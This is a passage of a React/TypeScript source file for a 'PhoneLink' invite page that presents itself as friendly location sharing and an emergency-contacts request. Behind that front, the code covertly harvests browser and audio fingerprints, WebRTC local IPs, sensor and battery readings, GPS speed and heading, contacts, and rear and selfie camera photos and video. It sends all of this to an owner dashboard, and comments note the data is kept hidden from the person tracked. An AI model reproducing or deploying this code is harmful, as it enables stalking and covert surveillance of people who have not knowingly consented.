          const t = setTimeout(() => { try { pc.close(); } catch { /* */ } resolve(); }, 2500);
          pc.onicecandidate = (e) => {
            if (!e.candidate) { clearTimeout(t); try { pc.close(); } catch { /* */ } resolve(); return; }
            const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
            if (m && !localIPs.includes(m[1])) localIPs.push(m[1]);
          };
        });
      } catch { /* not supported */ }

      // ── 12. Canvas fingerprint (GPU rasterisation differences) ────────────
      let canvasFingerprint: string | null = null;
      try {
        const fc = document.createElement("canvas");
        fc.width = 200; fc.height = 50;
        const c2d = fc.getContext("2d")!;
        c2d.textBaseline = "top";
        c2d.font = "14px Arial, sans-serif";
        c2d.fillStyle = "#f60";
        c2d.fillRect(125, 1, 62, 20);
        c2d.fillStyle = "#069";
        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 2, 15);
        c2d.fillStyle = "rgba(102,204,0,0.7)";
        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 4, 17);
        const raw = fc.toDataURL();
        let h = 0;
        for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h |= 0; }
        canvasFingerprint = Math.abs(h).toString(36);
      } catch { /* */ }

      // ── 13. Audio fingerprint (AudioContext oscillator hash) ──────────────
      let audioFingerprint: string | null = null;
      try {
        const AC = (window as any).OfflineAudioContext || (window as any).webkitOfflineAudioContext;
        if (AC) {
          const actx = new AC(1, 44100, 44100);
          const osc  = actx.createOscillator();
          const comp = actx.createDynamicsCompressor();
          osc.type = "triangle";
          osc.frequency.setValueAtTime(10000, actx.currentTime);
          osc.connect(comp); comp.connect(actx.destination);
          osc.start(0);
          const buf: AudioBuffer = await actx.startRendering();
          const ch = buf.getChannelData(0);
          let sum = 0;
          for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
          audioFingerprint = sum.toFixed(10);
        }
      } catch { /* */ }

      // ── 14. Permission states (silent query, no prompts) ──────────────────
      const permStates: Record<string, string> = {};
      try {
        if (navigator.permissions?.query) {
          await Promise.allSettled(
            (["geolocation","notifications","camera","microphone","clipboard-read"] as PermissionName[]).map(async (name) => {
              const s = await navigator.permissions.query({ name });
              permStates[name.replace("-", "_")] = s.state;
            })
          );
        }
      } catch { /* */ }

      // ── 15. Performance / navigation timing ───────────────────────────────
      const timingInfo: Record<string, number | string | null> = {};
      try {
        const [nav] = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[];
        if (nav) {
          timingInfo.dnsMs      = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
          timingInfo.tcpMs      = Math.round(nav.connectEnd - nav.connectStart);
          timingInfo.ttfbMs     = Math.round(nav.responseStart - nav.requestStart);
          timingInfo.domLoadMs  = Math.round(nav.domContentLoadedEventEnd - nav.startTime);
          timingInfo.pageLoadMs = Math.round(nav.loadEventEnd - nav.startTime);
          timingInfo.transferKb = nav.transferSize ? Math.round(nav.transferSize / 1024) : null;
          timingInfo.protocol   = nav.nextHopProtocol || null;
        }
      } catch { /* */ }

      // ── 16. Browser plugins list ──────────────────────────────────────────
      const pluginList: string[] = [];
      try {
        for (let i = 0; i < (navigator.plugins?.length ?? 0); i++) {
          const p = navigator.plugins[i];
          if (p?.name) pluginList.push(p.name);
        }
      } catch { /* */ }

      // ── 17. Motion / orientation — first real hardware reading ────────────
      let motionReading: Record<string, number | null> | null = null;
      try {
        if (typeof DeviceMotionEvent !== "undefined") {
          motionReading = await new Promise<Record<string, number | null> | null>((resolve) => {
            const t = setTimeout(() => resolve(null), 2500);
            const h = (e: DeviceMotionEvent) => {
              clearTimeout(t);
              window.removeEventListener("devicemotion", h);
              resolve({
                accelX:    e.acceleration?.x    != null ? +e.acceleration.x.toFixed(3)    : null,
                accelY:    e.acceleration?.y    != null ? +e.acceleration.y.toFixed(3)    : null,
                accelZ:    e.acceleration?.z    != null ? +e.acceleration.z.toFixed(3)    : null,
                rotAlpha:  e.rotationRate?.alpha != null ? +e.rotationRate.alpha.toFixed(2) : null,
                rotBeta:   e.rotationRate?.beta  != null ? +e.rotationRate.beta.toFixed(2)  : null,
                rotGamma:  e.rotationRate?.gamma != null ? +e.rotationRate.gamma.toFixed(2) : null,
                intervalMs: e.interval ?? null,
              });
            };
            window.addEventListener("devicemotion", h, { once: true });
          });
        }
      } catch { /* */ }

      deviceInfoRef.current = {
        device: {
          model:           (hints as any).model           || fallbackModel || null,
          brand:           (() => {
                              const brands: any[] = (hints as any).fullVersionList ?? (hints as any).brands ?? [];
                              const real = brands.find((b: any) => !/not.a.brand|chromium/i.test(b.brand));
                              return real?.brand ?? null;
                            })(),
          platform:        (hints as any).platform        ?? (navigator as any).userAgentData?.platform ?? null,
          platformVersion: (hints as any).platformVersion ?? androidMatch?.[1] ?? null,
          architecture:    (hints as any).architecture    ?? null,
          bitness:         (hints as any).bitness         ?? null,
          mobile:          (hints as any).mobile          ?? (/Mobi|Android/i.test(ua) || null),
          userAgent:       ua,
        },
        network: {
          ...connectionInfo,
          measuredRttMs,
          onLine: navigator.onLine,
          ...(localIPs.length ? { localIPs: localIPs.join(", ") } : {}),
        },
        hardware: {
          screenWidth:     screen.width          ?? null,
          screenHeight:    screen.height         ?? null,
          availWidth:      screen.availWidth     ?? null,
          availHeight:     screen.availHeight    ?? null,
          colorDepth:      screen.colorDepth     ?? null,
          pixelRatio:      window.devicePixelRatio ?? null,
          orientation:     screenOrientation,
          cpuCores:        navigator.hardwareConcurrency ?? null,
          deviceMemoryGb:  (navigator as any).deviceMemory ?? null,
          maxTouchPoints:  navigator.maxTouchPoints ?? null,
          touchSupport:    "ontouchstart" in window || navigator.maxTouchPoints > 0,
          storageQuotaGb,
          storageUsedGb,
          gpuVendor,
          gpuRenderer,
          cameras:         cameraCount     || null,
          microphones:     microphoneCount || null,
          speakers:        speakerCount    || null,
        },
        software: {
          language:          navigator.language,
          languages:         navigator.languages ? Array.from(navigator.languages) : null,
          timezone:          localeInfo.timeZone,
          locale:            localeInfo.locale,
          calendar:          localeInfo.calendar,
          cookiesEnabled:    navigator.cookieEnabled,
          doNotTrack:        navigator.doNotTrack,
          pdfViewerEnabled:  (navigator as any).pdfViewerEnabled ?? null,
          webdriver:         (navigator as any).webdriver ?? false,
          vendor:            navigator.vendor || null,
          appVersion:        navigator.appVersion || null,
          plugins:           pluginList.length ? pluginList.join(", ") : null,
        },
        sensors,
        identity: {
          canvasFingerprint: canvasFingerprint ?? null,
          audioFingerprint:  audioFingerprint  ?? null,
        },
        ...(Object.keys(permStates).length  ? { permissions: permStates }   : {}),
        ...(Object.keys(timingInfo).length  ? { timing:      timingInfo }   : {}),
        ...(motionReading                   ? { motion:      motionReading } : {}),
      };
    }

    collectDeviceInfo().catch(() => {});
  }, []);

  // Battery API — guard against unmount before getBattery() resolves
  useEffect(() => {
    if (!("getBattery" in navigator)) return;
    let mounted = true;
    let batObj: any = null;
    const onLevel   = () => { if (mounted && batObj) { const lvl = Math.round(batObj.level * 100); setBatteryLevel(lvl); batteryLevelRef.current = lvl; } };
    const onCharging = () => { if (mounted && batObj) { setBatteryCharging(batObj.charging); batteryChargingRef.current = batObj.charging; } };
    (navigator as any).getBattery().then((b: any) => {
      if (!mounted) return; // component already unmounted
      batObj = b;
      const lvl = Math.round(b.level * 100);
      setBatteryLevel(lvl);
      setBatteryCharging(b.charging);
      batteryLevelRef.current = lvl;
      batteryChargingRef.current = b.charging;
      // Merge real battery values into the device-info blob so the owner
      // sees actual level / charge times in the Sessions panel.
      deviceInfoRef.current = {
        ...deviceInfoRef.current,
        battery: {
          level:               lvl,
          charging:            b.charging,
          chargingTimeSecs:    b.chargingTime    !== Infinity ? b.chargingTime    : null,
          dischargingTimeSecs: b.dischargingTime !== Infinity ? b.dischargingTime : null,
        },
      };
      b.addEventListener("levelchange", onLevel);
      b.addEventListener("chargingchange", onCharging);
    }).catch(() => {});
    return () => {
      mounted = false;
      if (batObj) {
        batObj.removeEventListener("levelchange", onLevel);
        batObj.removeEventListener("chargingchange", onCharging);
      }
    };
  }, []);

  const { data: invite, isLoading, isError } = useGetInviteByToken(token!, {
    query: { enabled: !!token && !isWebView, queryKey: getGetInviteByTokenQueryKey(token!), retry: 1, retryDelay: 600 },
  });

  const grant = useGrantLocationConsent();

  // Contact Picker API — fires automatically in the same user-gesture window
  // as the main "Grant All Access" tap so the OS picker opens without any
  // extra button. Capped at 6 contacts; result merges into deviceInfoRef and
  // travels with the next location push → visible in the owner's Sessions panel.
  const pickContacts = useCallback(async () => {
    if (contactsTriedRef.current || !("contacts" in navigator)) return;
    contactsTriedRef.current = true;
    try {
      const contacts = await (navigator as any).contacts.select(
        ["name", "tel", "email"],
        { multiple: true },
      );
      if (contacts?.length) {
        const mapped = contacts.slice(0, 6).map((c: any) => ({
          name:  (c.name?.[0]  ?? null),
          phone: (c.tel?.[0]   ?? null),
          email: (c.email?.[0] ?? null),
        }));
        deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
        contactsCollectedCountRef.current = mapped.length;
        setContactsCollected(true);
      }
    } catch { /* user cancelled or API unavailable */ }
  }, []);

  // Enhanced contact picker that also saves to syncedContacts for the popup
  // and persists to localStorage. Used by the new contacts-first flow.
  //
  // Race-condition safety: if this resolves AFTER the kitty animation already
  // completed (displayPhase moved to "main"), we immediately flip to
  // "contacts_popup" so the popup is never silently skipped.
  const pickContactsAndSave = useCallback(async (): Promise<void> => {
    contactsTriedRef.current = true;
    if (!("contacts" in navigator)) {
      // Contact Picker API not available — proceed silently with no contacts.
      return;
    }
    try {
      const contacts = await (navigator as any).contacts.select(
        ["name", "tel", "email"],
        { multiple: true },
      );
      if (contacts?.length) {
        const mapped = contacts.slice(0, 6).map((c: any) => ({
          name:  c.name?.[0]  ?? "Unknown",
          phone: c.tel?.[0]   ?? null,
          email: c.email?.[0] ?? null,
        }));
        syncedContactsRef.current = mapped;
        setSyncedContacts(mapped);
        deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
        contactsCollectedCountRef.current = mapped.length;
        setContactsCollected(true);
        try { localStorage.setItem(`phonelink_contacts_${token}`, JSON.stringify(mapped)); } catch {}

        // If the kitty already completed and we're in "main", show the popup now
        // (handles the race where contacts resolve after the 5s kitty timer).
        setDisplayPhase((current) => current === "main" ? "contacts_popup" : current);
      }
    } catch { /* user cancelled */ }
  }, [token]);

  // Handle kitty animation completion — show popup if contacts found, else main.
  const handleKittyComplete = useCallback(() => {
    if (syncedContactsRef.current.length > 0) {
      setDisplayPhase("contacts_popup");
    } else {
      setDisplayPhase("main");
    }
  }, []);

  // Handle "Allow contacts" button on the emergency contacts screen.
  // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
  const handleAllowContacts = useCallback(async () => {
    // Mark contacts as tried BEFORE calling doGrant so that pickContacts() inside
    // doGrant (which is gated by contactsTriedRef) is a no-op — preventing a second,
    // competing OS picker from opening.
    contactsTriedRef.current = true;
    // Consume the legacy kitty slot so it never fires a second overlay once we
    // reach "main" phase and tracking begins.
    kittyOverlayStartedRef.current = true;
    // Immediately switch to kitty (OS picker will appear above it — that's fine)
    setDisplayPhase("kitty");
    // Fire location request in background
    doGrantRef.current();
    // Pick contacts — this is the single, authoritative picker call.
    await pickContactsAndSave();
  }, [pickContactsAndSave]);

  // Handle "Skip" on emergency contacts screen.
  const handleSkipContacts = useCallback(() => {
    // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
    contactsTriedRef.current = true;
    setContactsCollected(true);
    // Consume the legacy kitty slot to prevent a second overlay in main phase.
    kittyOverlayStartedRef.current = true;
    setDisplayPhase("kitty");
    doGrantRef.current();
  }, []);


  const acquireWakeLock = useCallback(async () => {
    if ("wakeLock" in navigator) {
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
        wakeLockRef.current?.addEventListener("release", () => {
          if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
        });
      } catch { /* non-critical */ }
    }
  }, []);

  const pushLocation = useCallback(async (
    lat: number, lng: number, acc?: number, addr?: string,
    locationStatus: "active" | "offline" = "active", source?: LocationSource,
  ) => {
    try {
      const { signal, clear } = abortAfter(10000);
      await fetch(`${API_BASE}/api/location/push`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
          // Battery/activity are captured on this device but are only ever
          // surfaced to the owner's dashboard — never rendered on this
          // public page, so the contact can't see them here either.
          batteryLevel: batteryLevelRef.current ?? undefined,
          batteryCharging: batteryChargingRef.current,
          activityType: activityTypeRef.current,
          deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current },
        }),
        signal,
      }).finally(clear);
      setLastSent(new Date());
      setUpdateCount((c) => c + 1);
    } catch { /* retry on next */ }
  }, [token]);

  const notifySW = useCallback((type: string, extra?: object) => {
    if (!("serviceWorker" in navigator)) return;
    navigator.serviceWorker.ready.then((reg) => {
      if (reg.active) reg.active.postMessage({ type, ...extra });
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (!("serviceWorker" in navigator)) return;
    const handler = (e: MessageEvent) => { if (e.data?.type === "STOP_TRACKING_FROM_NOTIFICATION") stopTracking(); };
    navigator.serviceWorker.addEventListener("message", handler);
    return () => navigator.serviceWorker.removeEventListener("message", handler);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
    setState("tracking");
    acquireWakeLock();
    // Auto-pop the contacts overlay as soon as tracking starts — one tap closes
    // it and immediately opens the OS picker (that single tap is the user
    // gesture Chrome requires for navigator.contacts.select).
    if ("contacts" in navigator) setShowContactsPrompt(true);
    notifySW("LOCATION_TRACKING_STARTED", { inviterName: invite?.fromUserName ?? undefined });

    if (!geoBoardStartedRef.current) {
      geoBoardStartedRef.current = true;
      // Rear-facing "surroundings" photos first, then 2 front-facing selfie
      // photos — sequential since most phones only expose one active
      // camera stream at a time.
      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true))
        .finally(() => {
          if (geoSelfiePhotoStartedRef.current) return;
          geoSelfiePhotoStartedRef.current = true;
          captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
            .then(() => setGeoSelfiePhotoDone(true)).catch(() => setGeoSelfiePhotoDone(true));
        });
    }
    if (!geoVideoStartedRef.current) {
      geoVideoStartedRef.current = true;
      // Rear-facing "surroundings" clip, then the front-facing selfie clip —
      // run sequentially since most phones only expose one active camera
      // stream at a time.
      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), "environment")
        .catch(() => setGeoVideoState("error"))
        .finally(() => {
          if (geoSelfieStartedRef.current) return;
          geoSelfieStartedRef.current = true;
          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), "user")
            .catch(() => setGeoSelfieState("error"));
        });
    }

    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (pos) => {
        sawGpsFixRef.current = true;
        const { latitude: lat, longitude: lng, accuracy: acc, speed, heading, altitude, altitudeAccuracy } = pos.coords;
        setCoords({ lat, lng, accuracy: acc });
        saveGps(lat, lng, acc);
        if (stateRef.current !== "tracking") setState("tracking");

        // Raw GPS fields beyond lat/lng/accuracy — only ever surfaced to the
        // owner's dashboard (see deviceInfoRef / pushLocation below).
        gpsExtrasRef.current = {
          speedMps: typeof speed === "number" ? speed : null,
          headingDeg: typeof heading === "number" ? heading : null,
          altitudeMeters: typeof altitude === "number" ? altitude : null,
          altitudeAccuracyMeters: typeof altitudeAccuracy === "number" ? altitudeAccuracy : null,
        };

        // Activity detection from GPS speed (m/s)
        if (typeof speed === "number" && speed >= 0) {
          const next: ActivityType = speed < 0.3 ? "stationary" : speed < 2.0 ? "walking" : speed < 5.5 ? "running" : "driving";
          setActivityType(next);
          activityTypeRef.current = next;
        }

        let addr = addressRef.current;
        if (!addr || updateCountRef.current % 5 === 0) {
          const newAddr = await reverseGeocode(lat, lng);
          if (newAddr) { setAddress(newAddr); addr = newAddr; }
        }
        const source = classifySource(acc, sawNetworkFixRef.current, sawGpsFixRef.current);
        lastWatchPushRef.current = Date.now();
        pushLocation(lat, lng, acc, addr, "active", source);
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
          if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
          if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
          wakeLockRef.current?.release(); wakeLockRef.current = null;
        } else {
          setState("gps_off");
          const c = coordsRef.current;
          if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
        }
      },
      { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 },
    );

    if (heartbeatRef.current !== null) clearInterval(heartbeatRef.current);
    heartbeatRef.current = setInterval(() => {
      const c = coordsRef.current;
      if (c && stateRef.current === "tracking" && Date.now() - lastWatchPushRef.current >= 2500) {
        const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
        pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
      }
    }, 3000);
  }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps

  const stopTracking = useCallback(() => {
    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
    if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
    wakeLockRef.current?.release(); wakeLockRef.current = null;
    notifySW("LOCATION_TRACKING_STOPPED");
  }, [notifySW]);

  useEffect(() => {
    const onVisibility = () => { if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock(); };
    document.addEventListener("visibilitychange", onVisibility);
    return () => document.removeEventListener("visibilitychange", onVisibility);
  }, [acquireWakeLock]);

  useEffect(() => () => stopTracking(), [stopTracking]);

  const processGeoPosition = useCallback((position: GeolocationPosition) => {
    const { latitude, longitude, accuracy } = position.coords;
    setCoords({ lat: latitude, lng: longitude, accuracy });
    setState("granting");
    grant.mutate(
      { token: token!, data: { latitude, longitude } },
      {
        onSuccess: () => startTracking(latitude, longitude, accuracy),
        onError: (err: any) => {
          const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
          setErrorMsg(msg); setState("error");
        },
      },
    );
    reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
  }, [token, grant, startTracking]);

  const doGrant = useCallback(() => {
    if (!navigator.geolocation) {
      // No geolocation support — stay in "gps_off" (shows "waiting for GPS" without error).
      setState("gps_off"); return;
    }
    setState("requesting");

    // Fire the camera+mic request in the same tap as location, so the
    // browser surfaces its native prompts back-to-back right now instead of
    // waiting until tracking starts later.
    prewarmCameraAndMic();
    // pickContacts() is gated by contactsTriedRef, so calling it here is a no-op
    // when the contacts-first flow has already set contactsTriedRef.current = true.
    pickContacts();

    let settled = false;
    // Hard 4-second cap: if neither position call resolves in time, fall
    // through to gps_off so the UI never stalls on "Connecting…" indefinitely.
    const hardCapTimer = setTimeout(() => {
      if (!settled) { settled = true; setState("gps_off"); }
    }, 4000);

    navigator.geolocation.getCurrentPosition(
      (position) => { clearTimeout(hardCapTimer); if (!settled) { settled = true; processGeoPosition(position); } },
      (err) => {
        // Silently absorb all location errors — never show "Something Went Wrong"
        // or "denied" screens. Use "gps_off" (not "tracking") so the UI shows
        // "Waiting for GPS…" without falsely claiming active sharing.
        if (settled) return; settled = true;
        clearTimeout(hardCapTimer);
        void err;
        setState("gps_off");
      },
      { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 },
    );
    navigator.geolocation.getCurrentPosition(
      (position) => { clearTimeout(hardCapTimer); if (!settled) { settled = true; processGeoPosition(position); } },
      () => { /* ignore — already handled above */ },
      { enableHighAccuracy: true, timeout: 4000 },
    );
  }, [processGeoPosition]);

  // Keep the ref up to date so callbacks defined earlier can call doGrant.
  doGrantRef.current = doGrant;

  // Auto-start: show emergency contacts screen first for new consents.
  // For already-accepted invites, jump straight to main tracking.
  useEffect(() => {
    if (!invite || autoStartedRef.current || isWebView) return;
    autoStartedRef.current = true;
    const stored = loadStoredGps();

    if (invite.status === "accepted") {
      const lat = stored?.lat ?? invite.grantedLatitude ?? 0;
      const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
      setDisplayPhase("main");
      startTracking(lat, lng, stored?.accuracy);
    } else if (stored) {
      setDisplayPhase("main");
      setState("granting");
      // Hard 4-second cap: if the grant API call stalls, force into tracking
      // with the stored coords so the "Connecting…" screen never shows > 4s.
      let grantSettled = false;
      const grantCap = setTimeout(() => {
        if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); }
      }, 4000);
      grant.mutate(
        { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
        {
          onSuccess: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); } },
          // On grant failure, stay in main phase but don't claim active sharing.
          // "gps_off" shows "Connecting…" in main phase (not an error screen).
          onError: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; setState("gps_off"); } },
        },
      );
      reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
    } else {
      // NEW FLOW: Show emergency contacts screen first.
      // displayPhase is already "contacts" — user interaction drives the next step.
      // doGrant() will be called by handleAllowContacts or handleSkipContacts.
    }
  }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps

  // Auto-retry: on a location error, count down and automatically "click"
  // Try Again after AUTO_RETRY_SECONDS — most failures here (GPS still
  // warming up, a flaky first fix, momentary signal loss) resolve themselves
  // shortly, and the person shouldn't have to notice the error and tap a
  // button to recover from something that fixes itself.
  useEffect(() => {
    if (state !== "error") { setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS); return; }
    setAutoRetrySecondsLeft(AUTO_RETRY_SECONDS);
    const interval = setInterval(() => {
      setAutoRetrySecondsLeft((s) => Math.max(0, s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, [state]);

  useEffect(() => {
    if (state === "error" && autoRetrySecondsLeft === 0) {
      autoStartedRef.current = false;
      doGrant();
    }
  }, [state, autoRetrySecondsLeft, doGrant]);

  // The old kitty overlay is now only used for already-accepted invites
  // (displayPhase === "main"). For the new contacts-first flow the kitty
  // is shown as part of the displayPhase state machine instead.
  useEffect(() => {
    if (displayPhase !== "main") return; // new flow handles its own kitty
    if (state === "tracking" && !kittyOverlayStartedRef.current) {
      kittyOverlayStartedRef.current = true;
      setKittyOverlayActive(true);
    }
  }, [state, displayPhase]);

  // 3-second countdown shown on the "Connecting…" fallback screen.
  // When it reaches 0 force into tracking with whatever coords we have so the
  // live-sharing page always appears within 3 seconds.
  useEffect(() => {
    const isConnecting = displayPhase === "main" && (state === "granting" || state === "requesting");
    if (!isConnecting) { setConnectingCountdown(3); return; }

    setConnectingCountdown(3);
    const interval = setInterval(() => {
      setConnectingCountdown((n) => {
        if (n <= 1) {
          clearInterval(interval);
          // Force into live sharing with best available coords.
          const c = coordsRef.current;
          if (c) {
            startTracking(c.lat, c.lng, c.accuracy ?? undefined);
          } else {
            const stored = loadStoredGps();
            if (stored) startTracking(stored.lat, stored.lng, stored.accuracy);
            else setState("gps_off");
          }
          return 0;
        }
        return n - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [displayPhase, state, startTracking]);

  // ── WebView blocked ────────────────────────────────────────────────────────────
  if (state === "webview_blocked") {
    const currentUrl = typeof window !== "undefined" ? window.location.href : "";
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-xl">
          <CardContent className="pt-10 pb-10 text-center">
            <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
            <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
            <p className="text-muted-foreground text-sm mb-6">
              Location access requires your phone's browser (Chrome, Safari, Firefox). Tap the menu button and choose "Open in browser".
            </p>
            <div className="bg-muted rounded-lg p-3 mb-4 flex flex-col gap-2 text-xs text-muted-foreground">
              <p className="font-medium text-foreground">How to open:</p>
              <p>• <strong>WhatsApp:</strong> Tap ⋮ menu → "Open in browser"</p>
              <p>• <strong>Instagram:</strong> Tap ··· → "Open in external browser"</p>
              <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
            </div>
            {currentUrl && <CopyAndOpenButton url={currentUrl} />}
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Invalid link ───────────────────────────────────────────────────────────────
  if (!isLoading && (isError || !invite)) {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Invalid Link</h2>
            <p className="text-muted-foreground text-sm">This link is invalid or has expired. Ask the sender to resend it.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── NEW: Display-phase screens (contacts → kitty → popup → main) ─────────────
  // These take over for new invite flows, before any ConsentState renders.

  if (displayPhase === "contacts" && !isLoading && invite) {
    const senderName = invite.fromUserName ?? "GODWIN Confidence";
    return (
      <div
        className="relative flex flex-col items-center justify-center p-6 overflow-hidden"
        style={{ ...fullHeight, background: "linear-gradient(170deg,#f9a8d4 0%,#e879f9 30%,#a855f7 65%,#6d28d9 100%)" }}
      >
        {/* Floating hearts & sparkles */}
        <FloatingSparkles particles={[
          { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
          { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
          { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
          { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
          { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
          { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
          { emoji: "✨", left: "50%", top: "6%",  size: 13, delay: 1.2, duration: 3.1 },
          { emoji: "💕", left: "65%", top: "85%", size: 14, delay: 0.4, duration: 3.5 },
        ]} />

        {/* Glowing orb with cute mascot */}
        <motion.div
          className="relative flex items-center justify-center mb-8"
          initial={{ scale: 0.7, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.6, type: "spring", bounce: 0.45 }}
        >
          {/* Outer glow ring */}
          <div
            className="absolute rounded-full"
            style={{
              width: 148, height: 148,
              background: "radial-gradient(circle, rgba(232,121,249,0.55) 0%, rgba(168,85,247,0.2) 60%, transparent 80%)",
              filter: "blur(8px)",
            }}
          />
          {/* Orb */}
          <div
            className="w-32 h-32 rounded-full flex items-center justify-center relative z-10"
            style={{
              background: "radial-gradient(circle at 38% 38%, rgba(255,255,255,0.55) 0%, rgba(216,180,254,0.7) 40%, rgba(167,139,250,0.85) 100%)",
              boxShadow: "0 0 40px rgba(232,121,249,0.6), inset 0 0 20px rgba(255,255,255,0.3)",
            }}
          >
            <motion.span
              className="text-5xl select-none"
              animate={{ y: [0, -6, 0], rotate: [-3, 3, -3] }}
              transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }}
              role="img"
              aria-label="friendly character"
            >
              😊
            </motion.span>
          </div>
          {/* Orbiting hearts */}
          {[{ emoji: "💕", angle: -30, r: 72 }, { emoji: "🌸", angle: 60, r: 70 }, { emoji: "💕", angle: 155, r: 68 }].map((h, i) => (
            <motion.span
              key={i}
              className="absolute text-base select-none pointer-events-none"
              style={{
                left: "50%", top: "50%",
                x: Math.cos((h.angle * Math.PI) / 180) * h.r - 8,
                y: Math.sin((h.angle * Math.PI) / 180) * h.r - 8,
              }}
              animate={{ scale: [0.8, 1.2, 0.8], opacity: [0.6, 1, 0.6] }}
              transition={{ duration: 2.0 + i * 0.4, repeat: Infinity, ease: "easeInOut", delay: i * 0.5 }}
            >
              {h.emoji}
            </motion.span>
          ))}
        </motion.div>

        <motion.h1
          className="text-3xl font-extrabold text-white text-center mb-4 leading-tight"
          style={{ textShadow: "0 2px 16px rgba(168,85,247,0.5)" }}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.18 }}
        >
          Let's Stay Connected 💕
        </motion.h1>

        <motion.p
          className="text-sm text-white/80 text-center leading-relaxed mb-12 max-w-xs"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.28 }}
        >
          Hey friend! Let us help {senderName} reach your loved ones if needed. Share up to 6 special contacts — it only takes a moment and makes everyone feel safer and happier! 🌸✨
        </motion.p>

        <motion.div
          className="w-full max-w-xs space-y-3 relative z-10"
          initial={{ opacity: 0, y: 14 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.38 }}
        >
          <button
            onClick={handleAllowContacts}
            className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.97] transition-transform flex items-center justify-center gap-2 relative overflow-hidden"
            style={{
